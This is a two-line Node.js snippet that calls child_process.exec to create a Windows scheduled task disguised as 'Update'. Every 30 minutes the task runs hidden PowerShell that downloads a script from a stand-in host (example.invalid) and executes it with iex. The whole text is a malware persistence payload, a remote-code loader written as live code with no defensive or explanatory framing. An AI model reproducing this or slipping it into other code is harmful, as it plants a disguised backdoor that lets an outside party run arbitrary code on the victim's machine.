const { exec } = require("child_process");
exec('schtasks /Create /TN Update /SC MINUTE /MO 30 /TR "powershell -w hidden -c iwr https://example.invalid/update.ps1 | iex" /f');
